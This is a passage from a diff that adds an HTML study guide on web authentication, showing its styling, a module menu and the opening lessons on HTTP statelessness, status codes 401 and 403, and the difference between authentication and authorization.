@@ -1,0 +1,2359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auth Mastery — JWT · OAuth · Security · Complete Study Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#07090f;--bg2:#0c1018;--bg3:#101622;--bg4:#141c2e;--bg5:#19243a;
+  --bdr:#1a2540;--bdr2:#22304e;
+  --t1:#d6e4ff;--t2:#6b84b0;--t3:#2e4060;
+  --a1:#00d4ff;--a2:#7c3aed;--a3:#10b981;--a4:#f59e0b;--a5:#f43f5e;--a6:#06b6d4;--a7:#8b5cf6;
+  --sw:280px;--top:54px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:'Outfit',sans-serif;background:var(--bg);color:var(--t1);line-height:1.6;overflow-x:hidden}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:400;height:var(--top);background:rgba(7,9,15,.95);border-bottom:1px solid var(--bdr);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:space-between}
+.tl{display:flex;align-items:center;height:100%;width:var(--sw);padding:0 20px;border-right:1px solid var(--bdr);gap:12px;flex-shrink:0}
+.tlogo{width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:#000;background:linear-gradient(135deg,var(--a1),var(--a2));box-shadow:0 0 20px rgba(0,212,255,.3)}
+.tbrand{font-size:14px;font-weight:800;color:var(--t1);letter-spacing:-.3px}.tbrand span{display:block;font-size:10px;font-weight:400;color:var(--t3)}
+.tr{display:flex;align-items:center;gap:14px;padding-right:20px}
+.tcnt{font-size:11px;color:var(--t3);font-family:'JetBrains Mono',monospace}
+.tpill{font-size:10px;font-weight:700;padding:3px 10px;border-radius:4px;background:rgba(0,212,255,.12);color:var(--a1);border:1px solid rgba(0,212,255,.25);font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.05em}
+.hbg{display:none;flex-direction:column;gap:4px;background:none;border:none;cursor:pointer;padding:4px}
+.hbg span{display:block;width:18px;height:1.5px;background:var(--t2);border-radius:1px}
+
+.layout{display:flex;padding-top:var(--top);min-height:100vh}
+.sidebar{width:var(--sw);flex-shrink:0;position:fixed;top:var(--top);left:0;bottom:0;background:var(--bg2);border-right:1px solid var(--bdr);overflow-y:auto;scrollbar-width:thin;scrollbar-color:var(--bdr2) transparent}
+.sidebar::-webkit-scrollbar{width:3px}.sidebar::-webkit-scrollbar-thumb{background:var(--bdr2)}
+.sg{padding:16px 16px 5px;font-size:9px;font-weight:700;letter-spacing:.16em;color:var(--t3);text-transform:uppercase;font-family:'JetBrains Mono',monospace}
+.sg:first-child{padding-top:13px}
+.ni{display:flex;align-items:center;gap:8px;padding:7px 16px;cursor:pointer;font-size:12px;color:var(--t2);border-left:2px solid transparent;transition:all .13s;text-decoration:none;user-select:none}
+.ni:hover{background:var(--bg3);color:var(--t1)}.ni.on{color:var(--a1);background:rgba(0,212,255,.07);border-left-color:var(--a1);font-weight:600}
+.nd{width:6px;height:6px;border-radius:50%;flex-shrink:0}
+.nt{margin-left:auto;font-size:9px;font-family:'JetBrains Mono',monospace;font-weight:700;padding:2px 6px;border-radius:3px;text-transform:uppercase;letter-spacing:.04em}
+.n1{background:rgba(0,212,255,.13);color:var(--a1)}.n2{background:rgba(124,58,237,.13);color:var(--a2)}.n3{background:rgba(16,185,129,.13);color:var(--a3)}.n4{background:rgba(245,158,11,.13);color:var(--a4)}.n5{background:rgba(244,63,94,.13);color:var(--a5)}.n6{background:rgba(6,182,212,.13);color:var(--a6)}.n7{background:rgba(139,92,246,.13);color:var(--a7)}
+
+.main{margin-left:var(--sw);flex:1;padding:36px 46px 80px;max-width:950px}
+.sec{display:none}.sec.on{display:block;animation:fi .22s ease both}
+@keyframes fi{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+.hero{padding-bottom:24px;margin-bottom:28px;border-bottom:1px solid var(--bdr)}
+.hero-eyebrow{display:inline-flex;align-items:center;gap:8px;background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.2);border-radius:100px;padding:5px 14px;font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--a1);font-weight:700;margin-bottom:14px;font-family:'JetBrains Mono',monospace}
+.hero-dot{width:6px;height:6px;border-radius:50%;background:var(--a1);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
+.htitle{font-size:26px;font-weight:800;color:var(--t1);line-height:1.2;margin-bottom:8px;letter-spacing:-.5px}
+.htitle span{background:linear-gradient(90deg,var(--a1),var(--a2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hsub{font-size:13.5px;color:var(--t2);line-height:1.7;max-width:700px}
+
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:22px}
+.stat{background:var(--bg3);border:1px solid var(--bdr);border-radius:7px;padding:11px 14px}
+.sl{font-size:9px;color:var(--t3);font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.06em;margin-bottom:3px}
+.sv{font-size:13px;font-weight:700;font-family:'JetBrains Mono',monospace}
+
+.card{background:var(--bg3);border:1px solid var(--bdr);border-radius:8px;padding:18px 20px;margin-bottom:12px}
+.ca1{border-left:3px solid var(--a1);background:rgba(0,212,255,.04)}.ca2{border-left:3px solid var(--a2);background:rgba(124,58,237,.04)}.ca3{border-left:3px solid var(--a3);background:rgba(16,185,129,.04)}.ca4{border-left:3px solid var(--a4);background:rgba(245,158,11,.04)}.ca5{border-left:3px solid var(--a5);background:rgba(244,63,94,.04)}.ca6{border-left:3px solid var(--a6);background:rgba(6,182,212,.04)}.ca7{border-left:3px solid var(--a7);background:rgba(139,92,246,.04)}
+.ct{font-size:13px;font-weight:700;color:var(--t1);margin-bottom:5px}.cb{font-size:12.5px;color:var(--t2);line-height:1.7}
+
+.code{background:#04060c;border:1px solid var(--bdr);border-radius:7px;padding:16px 18px;margin:12px 0;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.85;overflow-x:auto;white-space:pre}
+.code .k{color:#a78bfa}.code .s{color:#10b981}.code .f{color:#00d4ff}.code .c{color:#2e4060}.code .o{color:#f59e0b}.code .n{color:#fbbf24}.code .p{color:#f43f5e}.code .t{color:#06b6d4}.code .b{color:#60a5fa}.code .g{color:#34d399}
+.clabel{background:#04060c;border:1px solid var(--bdr);border-bottom:none;border-radius:7px 7px 0 0;padding:7px 18px 0;font-size:9px;font-weight:700;font-family:'JetBrains Mono',monospace;color:var(--t3);text-transform:uppercase;letter-spacing:.1em}
+.clabel+.code{border-top:none;border-radius:0 0 7px 7px;margin-top:0}
+code{font-family:'JetBrains Mono',monospace;font-size:11px;background:rgba(255,255,255,.07);color:var(--a4);padding:1px 5px;border-radius:3px}
+
+.callout{border-radius:7px;padding:13px 16px;margin:12px 0;font-size:13px;line-height:1.65}
+.q1{background:rgba(0,212,255,.07);border:1px solid rgba(0,212,255,.22);color:#93d4f8}
+.q2{background:rgba(124,58,237,.07);border:1px solid rgba(124,58,237,.22);color:#c4b5fd}
+.q3{background:rgba(16,185,129,.07);border:1px solid rgba(16,185,129,.22);color:#6ee7b7}
+.q4{background:rgba(245,158,11,.07);border:1px solid rgba(245,158,11,.22);color:#fde68a}
+.q5{background:rgba(244,63,94,.07);border:1px solid rgba(244,63,94,.22);color:#fca5a5}
+.q7{background:rgba(139,92,246,.07);border:1px solid rgba(139,92,246,.22);color:#ddd6fe}
+.callout strong{font-weight:700;color:inherit}
+
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
+.g4{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+.mini{background:var(--bg4);border:1px solid var(--bdr);border-radius:6px;padding:13px 15px}
+.mt{font-size:12px;font-weight:700;margin-bottom:3px;font-family:'JetBrains Mono',monospace}
+.mb{font-size:12px;color:var(--t2);line-height:1.55}
+
+.tw{overflow-x:auto;margin:12px 0}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+thead tr{background:var(--bg4)}
+th{text-align:left;padding:9px 14px;font-size:9px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);border-bottom:1px solid var(--bdr2);font-family:'JetBrains Mono',monospace}
+td{padding:10px 14px;border-bottom:1px solid var(--bdr);color:var(--t2)}
+td:first-child{color:var(--t1);font-weight:600}
+tr:hover td{background:rgba(255,255,255,.018)}tr:last-child td{border-bottom:none}
+
+.pill{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:3px;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.04em}
+.p1{background:rgba(0,212,255,.15);color:var(--a1)}.p2{background:rgba(124,58,237,.15);color:var(--a2)}.p3{background:rgba(16,185,129,.15);color:var(--a3)}.p4{background:rgba(245,158,11,.15);color:var(--a4)}.p5{background:rgba(244,63,94,.15);color:var(--a5)}.p6{background:rgba(6,182,212,.15);color:var(--a6)}.p7{background:rgba(139,92,246,.15);color:var(--a7)}
+
+.flow{background:#04060c;border:1px solid var(--bdr);border-radius:8px;padding:20px;margin:12px 0;overflow-x:auto}
+.fr{display:flex;align-items:center;gap:4px;flex-wrap:nowrap;min-width:fit-content}
+.fbox{padding:10px 14px;border-radius:6px;font-size:11px;font-family:'JetBrains Mono',monospace;font-weight:700;border:1px solid;text-align:center;white-space:nowrap;line-height:1.4}
+.fa{color:var(--t3);font-size:14px;padding:0 4px;flex-shrink:0}
+
+.steps{margin:14px 0}
+.step{display:flex;gap:14px;margin-bottom:4px}
+.sl2{display:flex;flex-direction:column;align-items:center}
+.sdot{width:27px;height:27px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;font-family:'JetBrains Mono',monospace;margin-top:2px}
+.sv2{width:2px;flex:1;min-height:18px;margin:3px 0;background:var(--bdr2)}
+.sc{flex:1;padding-bottom:16px}.stitle{font-size:13px;font-weight:700;color:var(--t1);margin-bottom:3px}.sbody{font-size:12px;color:var(--t2);line-height:1.6}
+
+.cmp{display:grid;grid-template-columns:1fr 1fr;border:1px solid var(--bdr);border-radius:8px;overflow:hidden;margin:14px 0}
+.cmpc{padding:16px 18px}.cmpc:first-child{border-right:1px solid var(--bdr);background:rgba(0,212,255,.03)}.cmpc:last-child{background:rgba(16,185,129,.03)}
+.cmpc h3{font-size:13px;font-weight:700;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--bdr)}
+.cmpc li{font-size:12px;color:var(--t2);padding:3px 0;list-style:none;display:flex;gap:7px;line-height:1.5}
+.cmpc li::before{content:"·";color:var(--t3);flex-shrink:0}
+
+.layers{display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.layer{border-radius:5px;padding:10px 15px;border-left:3px solid}
+.lname{font-size:12px;font-weight:700;margin-bottom:2px;font-family:'JetBrains Mono',monospace}
+.ldesc{font-size:11.5px;color:var(--t2)}
+
+.dd{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0}
+.do{background:rgba(16,185,129,.05);border:1px solid rgba(16,185,129,.18);border-radius:7px;padding:13px 15px}
+.dont{background:rgba(244,63,94,.05);border:1px solid rgba(244,63,94,.18);border-radius:7px;padding:13px 15px}
+.do h4,.dont h4{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.1em;margin-bottom:7px;font-family:'JetBrains Mono',monospace}
+.do h4{color:var(--a3)}.dont h4{color:var(--a5)}
+.do li,.dont li{font-size:12px;color:var(--t2);list-style:none;padding:3px 0 3px 14px;position:relative;line-height:1.5}
+.do li::before{content:"✓";position:absolute;left:0;color:var(--a3);font-size:10px;top:4px}.dont li::before{content:"✗";position:absolute;left:0;color:var(--a5);font-size:10px;top:4px}
+
+.acc{border:1px solid var(--bdr);border-radius:7px;overflow:hidden;margin-bottom:7px}
+.acc-h{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;cursor:pointer;background:var(--bg3);font-size:12.5px;font-weight:600;color:var(--t1);transition:background .13s;user-select:none}
+.acc-h:hover{background:var(--bg4)}.acc-ico{color:var(--t3);font-size:17px;transition:transform .18s;font-style:normal}
+.acc-b{display:none;padding:14px 16px;font-size:12px;color:var(--t2);line-height:1.65;background:var(--bg4);border-top:1px solid var(--bdr)}
+.acc.open .acc-b{display:block}.acc.open .acc-ico{transform:rotate(45deg)}
+
+.providers{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:14px 0}
+.pcard{background:var(--bg4);border:1px solid var(--bdr);border-radius:8px;padding:14px;transition:border-color .15s}
+.pcard:hover{border-color:var(--bdr2)}
+.pname{font-size:13px;font-weight:700;color:var(--t1);margin-bottom:4px}
+.ptag{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;padding:2px 7px;border-radius:3px;display:inline-block;margin-bottom:6px;font-family:'JetBrains Mono',monospace}
+.pbody{font-size:11.5px;color:var(--t2);line-height:1.5}
+
+.div{height:1px;background:var(--bdr);margin:24px 0}
+h2{font-size:18px;font-weight:700;color:var(--t1);margin:24px 0 10px}h2:first-child{margin-top:0}
+h3{font-size:14px;font-weight:700;color:var(--t1);margin:18px 0 8px}
+p{font-size:13px;color:var(--t2);line-height:1.7;margin-bottom:10px}p:last-child{margin-bottom:0}
+strong{color:var(--t1);font-weight:700}
+ul.list{margin:8px 0 12px 0;padding:0}
+ul.list li{font-size:12.5px;color:var(--t2);list-style:none;padding:4px 0 4px 16px;position:relative;line-height:1.6}
+ul.list li::before{content:"▸";position:absolute;left:0;color:var(--a1);font-size:9px;top:6px}
+
+.overlay{display:none;position:fixed;inset:var(--top) 0 0 0;background:rgba(0,0,0,.7);z-index:100}
+.overlay.open{display:block}
+@media(max-width:900px){.main{padding:24px 22px 60px;max-width:100%}}
+@media(max-width:700px){
+  :root{--sw:268px}.main{margin-left:0;padding:20px 15px 60px}
+  .sidebar{transform:translateX(-100%);transition:transform .22s;z-index:110}.sidebar.open{transform:translateX(0)}
+  .hbg{display:flex}.tl{width:auto;border-right:none}.tcnt{display:none}
+  .stats,.g2,.g3,.g4,.dd,.cmp{grid-template-columns:1fr}
+  .providers{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){.htitle{font-size:20px}.stats{grid-template-columns:1fr 1fr}.providers{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="tl">
+    <div class="tlogo">🔐</div>
+    <div class="tbrand">Auth Mastery<span>JWT · OAuth · Security — Beginner to Advanced</span></div>
+  </div>
+  <div class="tr">
+    <button class="hbg" id="hbg"><span></span><span></span><span></span></button>
+    <span class="tcnt">30 modules · 200+ concepts</span>
+    <span class="tpill">v1.0</span>
+  </div>
+</header>
+
+<div class="overlay" id="ov"></div>
+<div class="layout">
+
+<!-- SIDEBAR -->
+<nav class="sidebar" id="sb">
+  <div class="sg">Foundations</div>
+  <a class="ni on" onclick="go('intro')"><span class="nd" style="background:var(--a1)"></span>What is Auth?<span class="nt n1">Start</span></a>
+  <a class="ni" onclick="go('http-stateless')"><span class="nd" style="background:var(--a3)"></span>HTTP & Statelessness<span class="nt n3">Core</span></a>
+  <a class="ni" onclick="go('authn-vs-authz')"><span class="nd" style="background:var(--a4)"></span>AuthN vs AuthZ<span class="nt n4">Core</span></a>
+  <a class="ni" onclick="go('auth-compare')"><span class="nd" style="background:var(--a5)"></span>All Methods Compared<span class="nt n5">Key</span></a>
+
+  <div class="sg">Classic Auth</div>
+  <a class="ni" onclick="go('basic-auth')"><span class="nd" style="background:var(--a1)"></span>Basic Auth<span class="nt n1">Beginner</span></a>
+  <a class="ni" onclick="go('sessions-cookies')"><span class="nd" style="background:var(--a6)"></span>Sessions & Cookies<span class="nt n6">Beginner</span></a>
+  <a class="ni" onclick="go('api-keys')"><span class="nd" style="background:var(--a7)"></span>API Keys<span class="nt n7">Beginner</span></a>
+
+  <div class="sg">JWT Deep Dive</div>
+  <a class="ni" onclick="go('jwt-intro')"><span class="nd" style="background:var(--a1)"></span>What is JWT?<span class="nt n1">Core</span></a>
+  <a class="ni" onclick="go('jwt-structure')"><span class="nd" style="background:var(--a2)"></span>JWT Structure<span class="nt n2">Core</span></a>
+  <a class="ni" onclick="go('jwt-flow')"><span class="nd" style="background:var(--a3)"></span>JWT Auth Flow<span class="nt n3">Core</span></a>
+  <a class="ni" onclick="go('jwt-fastapi')"><span class="nd" style="background:var(--a4)"></span>JWT in FastAPI<span class="nt n4">Build</span></a>
+  <a class="ni" onclick="go('jwt-django')"><span class="nd" style="background:var(--a5)"></span>JWT in Django<span class="nt n5">Build</span></a>
+  <a class="ni" onclick="go('jwt-frontend')"><span class="nd" style="background:var(--a6)"></span>JWT in JS Frontend<span class="nt n6">Build</span></a>
+  <a class="ni" onclick="go('refresh-tokens')"><span class="nd" style="background:var(--a7)"></span>Access & Refresh Tokens<span class="nt n7">Mid</span></a>
+
+  <div class="sg">OAuth 2.0</div>
+  <a class="ni" onclick="go('oauth-intro')"><span class="nd" style="background:var(--a1)"></span>What is OAuth 2.0?<span class="nt n1">Core</span></a>
+  <a class="ni" onclick="go('oauth-flows')"><span class="nd" style="background:var(--a2)"></span>OAuth Grant Types<span class="nt n2">Mid</span></a>
+  <a class="ni" onclick="go('oauth-fastapi')"><span class="nd" style="background:var(--a3)"></span>OAuth in FastAPI<span class="nt n3">Build</span></a>
+  <a class="ni" onclick="go('social-login')"><span class="nd" style="background:var(--a4)"></span>Social Login (Google)<span class="nt n4">Build</span></a>
+
+  <div class="sg">OpenID & SAML</div>
+  <a class="ni" onclick="go('oidc')"><span class="nd" style="background:var(--a1)"></span>OpenID Connect<span class="nt n1">Mid</span></a>
+  <a class="ni" onclick="go('saml')"><span class="nd" style="background:var(--a7)"></span>SAML 2.0<span class="nt n7">Adv</span></a>
+
+  <div class="sg">Passwords & Hashing</div>
+  <a class="ni" onclick="go('password-hashing')"><span class="nd" style="background:var(--a2)"></span>Password Hashing<span class="nt n2">Core</span></a>
+  <a class="ni" onclick="go('mfa')"><span class="nd" style="background:var(--a3)"></span>MFA / 2FA / TOTP<span class="nt n3">Mid</span></a>
+
+  <div class="sg">Authorization</div>
+  <a class="ni" onclick="go('rbac')"><span class="nd" style="background:var(--a1)"></span>RBAC — Role-Based<span class="nt n1">Mid</span></a>
+  <a class="ni" onclick="go('abac')"><span class="nd" style="background:var(--a5)"></span>ABAC — Attribute-Based<span class="nt n5">Adv</span></a>
+  <a class="ni" onclick="go('permissions')"><span class="nd" style="background:var(--a6)"></span>Permissions & Scopes<span class="nt n6">Mid</span></a>
+
+  <div class="sg">Admin Panel Security</div>
+  <a class="ni" onclick="go('admin-panel')"><span class="nd" style="background:var(--a4)"></span>Admin Panel Auth<span class="nt n4">Mid</span></a>
+  <a class="ni" onclick="go('django-admin')"><span class="nd" style="background:var(--a7)"></span>Django Admin Security<span class="nt n7">Build</span></a>
+
+  <div class="sg">Service & API Security</div>
+  <a class="ni" onclick="go('service-auth')"><span class="nd" style="background:var(--a2)"></span>Service-to-Service Auth<span class="nt n2">Mid</span></a>
+  <a class="ni" onclick="go('webhook-security')"><span class="nd" style="background:var(--a3)"></span>Webhook Signatures<span class="nt n3">Build</span></a>
+  <a class="ni" onclick="go('ws-webrtc-auth')"><span class="nd" style="background:var(--a5)"></span>WebSocket & WebRTC Auth<span class="nt n5">Mid</span></a>
+
+  <div class="sg">Token Storage & Transport</div>
+  <a class="ni" onclick="go('token-storage')"><span class="nd" style="background:var(--a1)"></span>Where to Store Tokens<span class="nt n1">Key</span></a>
+  <a class="ni" onclick="go('cors-csrf')"><span class="nd" style="background:var(--a5)"></span>CORS & CSRF<span class="nt n5">Key</span></a>
+
+  <div class="sg">Attacks & Defenses</div>
+  <a class="ni" onclick="go('attacks')"><span class="nd" style="background:var(--a5)"></span>Common Auth Attacks<span class="nt n5">Adv</span></a>
+  <a class="ni" onclick="go('rate-limiting')"><span class="nd" style="background:var(--a4)"></span>Rate Limiting & Brute Force<span class="nt n4">Ops</span></a>
+
+  <div class="sg">Production</div>
+  <a class="ni" onclick="go('nginx-auth')"><span class="nd" style="background:var(--a3)"></span>Nginx Auth Config<span class="nt n3">Ops</span></a>
+  <a class="ni" onclick="go('azure-auth')"><span class="nd" style="background:var(--a6)"></span>Azure / Cloud Auth<span class="nt n6">Ops</span></a>
+  <a class="ni" onclick="go('checklist')"><span class="nd" style="background:var(--a2)"></span>Security Checklist<span class="nt n2">Ref</span></a>
+</nav>
+
+<!-- MAIN -->
+<main class="main">
+
+<!-- ═══ INTRO ═══ -->
+<section id="sec-intro" class="sec on">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Auth Mastery · Module 1</div>
+    <h1 class="htitle">What is <span>Authentication</span>?</h1>
+    <p class="hsub">Authentication and Authorization are the two pillars of security in every web app, API, and service you build. This guide takes you from zero to production-grade — covering JWT, OAuth, sessions, API keys, RBAC, MFA, and everything in between. Focused on FastAPI, Django, and HTML/JS frontend.</p>
+  </div>
+
+  <div class="stats">
+    <div class="stat"><div class="sl">Backend</div><div class="sv" style="color:var(--a1)">FastAPI / Django</div></div>
+    <div class="stat"><div class="sl">Frontend</div><div class="sv" style="color:var(--a3)">HTML · CSS · JS</div></div>
+    <div class="stat"><div class="sl">Infra</div><div class="sv" style="color:var(--a2)">Azure + Nginx</div></div>
+    <div class="stat"><div class="sl">Coverage</div><div class="sv" style="color:var(--a4)">30 Modules</div></div>
+  </div>
+
+  <h2>The two questions every request must answer</h2>
+  <div class="g2">
+    <div class="card ca1">
+      <div class="ct">🪪 Authentication — "Who are you?"</div>
+      <div class="cb">Verifying the identity of a user or service. Are you who you claim to be? Proved by something you know (password), something you have (OTP device), or something you are (biometric). Without authentication, anyone can claim to be anyone.</div>
+    </div>
+    <div class="card ca3">
+      <div class="ct">🔑 Authorization — "What can you do?"</div>
+      <div class="cb">Determining what an authenticated identity is allowed to do. Can this user read this file? Can this service call this endpoint? Authorization always comes after authentication. You must know WHO someone is before deciding WHAT they can do.</div>
+    </div>
+  </div>
+
+  <div class="callout q4"><strong>The core mistake beginners make:</strong> Treating authentication and authorization as the same thing. They are completely separate concerns. A logged-in user (authenticated) may still be blocked from admin pages (not authorized). Always handle them independently in your code.</div>
+
+  <h2>The authentication ecosystem at a glance</h2>
+  <div class="layers">
+    <div class="layer" style="border-color:var(--a5);background:rgba(244,63,94,.04)"><div class="lname" style="color:var(--a5)">Identity Verification (Who) — Passwords · MFA · Biometrics · SSO</div><div class="ldesc">Proving who you are. The user provides credentials; the server validates them against stored data.</div></div>
+    <div style="text-align:center;color:var(--t3);font-size:11px;padding:4px;font-family:'JetBrains Mono',monospace">↓ once verified, issue a credential</div>
+    <div class="layer" style="border-color:var(--a1);background:rgba(0,212,255,.04)"><div class="lname" style="color:var(--a1)">Token / Session Issuance — JWT · Session ID · API Key · OAuth Token</div><div class="ldesc">Server gives back proof of identity. Client presents this on every subsequent request so the server doesn't need to re-verify credentials each time.</div></div>
+    <div style="text-align:center;color:var(--t3);font-size:11px;padding:4px;font-family:'JetBrains Mono',monospace">↓ every request carries the credential</div>
+    <div class="layer" style="border-color:var(--a3);background:rgba(16,185,129,.04)"><div class="lname" style="color:var(--a3)">Authorization Check (What) — RBAC · ABAC · Scopes · Permissions</div><div class="ldesc">Server validates the credential and checks permissions. Does this token allow access to this resource? Is this role allowed this action?</div></div>
+    <div style="text-align:center;color:var(--t3);font-size:11px;padding:4px;font-family:'JetBrains Mono',monospace">↓ allow or deny</div>
+    <div class="layer" style="border-color:var(--a4);background:rgba(245,158,11,.04)"><div class="lname" style="color:var(--a4)">Resource Access — API Endpoints · Files · Database Rows · Admin Actions</div><div class="ldesc">The protected resource is returned only if the identity is verified AND authorized. Otherwise, 401 Unauthorized or 403 Forbidden is returned.</div></div>
+  </div>
+
+  <h2>Why HTTP makes auth hard</h2>
+  <div class="callout q1"><strong>HTTP is stateless.</strong> Every request is completely independent — the server remembers nothing from the previous request. This means every single request must carry some proof of identity, or the user must log in every time. Auth systems exist entirely to solve this statelessness problem.</div>
+
+  <div class="g3">
+    <div class="mini"><div class="mt" style="color:var(--a5)">The problem</div><div class="mb">HTTP has no built-in concept of "a user" or "a session." Every GET, POST, PUT, DELETE arrives as a fresh, anonymous request.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a4)">The solution (server-side)</div><div class="mb">Sessions: server stores login state in memory/DB, gives client a session ID cookie. Server "remembers" you via the ID.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a1)">The modern solution</div><div class="mb">Tokens (JWT): client stores a signed token, sends it with every request. Server verifies the signature — no server-side storage needed.</div></div>
+  </div>
+</section>
+
+<!-- ═══ HTTP STATELESS ═══ -->
+<section id="sec-http-stateless" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 2 · Foundation</div>
+    <h1 class="htitle">HTTP &amp; <span>Statelessness</span></h1>
+    <p class="hsub">Understanding HTTP's stateless nature is the foundation of all authentication design decisions. Every auth mechanism is a workaround for the fact that HTTP has no memory.</p>
+  </div>
+
+  <h2>How HTTP works (no auth)</h2>
+  <div class="flow">
+    <div class="fr">
+      <div class="fbox" style="background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--a1)">Browser</div>
+      <div class="fa">──GET /page──▶</div>
+      <div class="fbox" style="background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.3);color:var(--a3)">Server</div>
+      <div class="fa">◀──200 OK──</div>
+      <div class="fbox" style="background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--a1)">Browser</div>
+      <div class="fa">──GET /api──▶</div>
+      <div class="fbox" style="background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.3);color:var(--a3)">Server</div>
+      <div class="fa" style="color:var(--a5)">← WHO ARE YOU?</div>
+    </div>
+  </div>
+  <p>The server has no idea the second request came from the same person as the first. Each request is a blank slate. The solution is to include <strong>credentials on every request</strong> — either via a cookie (automatic, browser-managed), or a header (manual, JS-managed).</p>
+
+  <h2>The three ways to carry credentials in HTTP</h2>
+  <div class="g3">
+    <div class="mini"><div class="mt" style="color:var(--a1)">HTTP Header</div><div class="mb"><code>Authorization: Bearer &lt;token&gt;</code><br>or<br><code>X-API-Key: &lt;key&gt;</code><br>Used for APIs. JS sets this manually on every fetch/axios call.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a3)">Cookie</div><div class="mb"><code>Cookie: session_id=abc123</code><br>Browser sends automatically on every request to same domain. No JS needed. Used for web apps.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a4)">Query Param</div><div class="mb"><code>GET /api?api_key=xyz</code><br>Least secure — key appears in logs, browser history, server access logs. Only use for webhooks where you must.</div></div>
+  </div>
+
+  <h2>Status codes you must know</h2>
+  <div class="tw"><table>
+    <thead><tr><th>Code</th><th>Meaning</th><th>When returned</th><th>Your response</th></tr></thead>
+    <tbody>
+      <tr><td>200 OK</td><td>Success</td><td>Auth passed, resource returned</td><td>Show the data</td></tr>
+      <tr><td>401 Unauthorized</td><td>Not authenticated</td><td>No token, expired token, bad token</td><td>Redirect to login</td></tr>
+      <tr><td>403 Forbidden</td><td>Not authorized</td><td>Valid token, but insufficient permissions</td><td>Show "Access Denied" page</td></tr>
+      <tr><td>400 Bad Request</td><td>Malformed request</td><td>Missing required fields, bad JSON</td><td>Show validation error</td></tr>
+      <tr><td>422 Unprocessable</td><td>Validation failed</td><td>FastAPI default for schema errors</td><td>Show field-level error</td></tr>
+    </tbody>
+  </table></div>
+  <div class="callout q5"><strong>401 vs 403:</strong> 401 means "I don't know who you are — please log in." 403 means "I know who you are, but you're not allowed here." This distinction matters for frontend UX: 401 → redirect to /login, 403 → show an error page without redirecting.</div>
+</section>
+
+<!-- ═══ AUTHN VS AUTHZ ═══ -->
+<section id="sec-authn-vs-authz" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 3 · Core Concept</div>
+    <h1 class="htitle">AuthN vs <span>AuthZ</span></h1>
+    <p class="hsub">Authentication and Authorization are different problems requiring different solutions. Confusing them leads to security holes.</p>
+  </div>
+  <div class="cmp">
+    <div class="cmpc"><h3 style="color:var(--a1)">Authentication (AuthN)</h3>
+      <ul>
+        <li>Proves identity: "Are you really Alice?"</li>
+        <li>Happens once at login</li>
+        <li>Result: a token or session is issued</li>
+        <li>Tools: passwords, MFA, biometrics, OAuth</li>
+        <li>Failure returns HTTP 401</li>
+        <li>Question: <strong>Who are you?</strong></li>
+      </ul>
+    </div>
+    <div class="cmpc"><h3 style="color:var(--a3)">Authorization (AuthZ)</h3>
+      <ul>
+        <li>Proves permissions: "Can Alice do this?"</li>
+        <li>Happens on every protected request</li>
+        <li>Result: allow or deny the action</li>
+        <li>Tools: RBAC, ABAC, scopes, permission checks</li>
+        <li>Failure returns HTTP 403</li>
+        <li>Question: <strong>What can you do?</strong></li>
+      </ul>
+    </div>
+  </div>
+
+  <h2>Real-world example — your voice calling app</h2>
+  <div class="steps">
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(0,212,255,.2);color:var(--a1)">1</div><div class="sv2"></div></div><div class="sc"><div class="stitle">User logs in (AuthN)</div><div class="sbody">Alice sends username + password to <code>POST /api/login</code>. FastAPI verifies the hash. If correct, issues a JWT. Alice is now authenticated.</div></div></div>
